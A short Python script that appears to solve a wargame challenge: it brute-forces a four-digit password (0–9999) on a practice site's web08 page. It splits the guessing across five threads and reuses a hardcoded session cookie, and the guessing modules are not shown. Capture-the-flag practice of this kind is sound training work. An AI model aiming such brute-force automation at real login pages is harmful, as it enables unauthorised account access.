import requests
from concurrent.futures import ThreadPoolExecutor
import part1, part2, part3, part4, part5
import time
start=time.time()
URL="http://suninatas.com/Part_one/web08/web08.asp"

cookie={
    "ASPSESSIONIDSSBQARAS":"OLNFADNDNDFHNPODNAPIGADJ"
    }

session=requests.Session()

print ("\n\nSearching Pass : 0 ~ 9999")
with ThreadPoolExecutor(max_workers=5) as executor:
    p1=executor.submit(part1.part1, session, URL, cookie)
    p2=executor.submit(part2.part2, session, URL, cookie)
    p3=executor.submit(part3.part3, session, URL, cookie)
    p4=executor.submit(part4.part4, session, URL, cookie)
    p5=executor.submit(part5.part5, session, URL, cookie)

end=time.time()-start
print ("%d"%(float(end)))

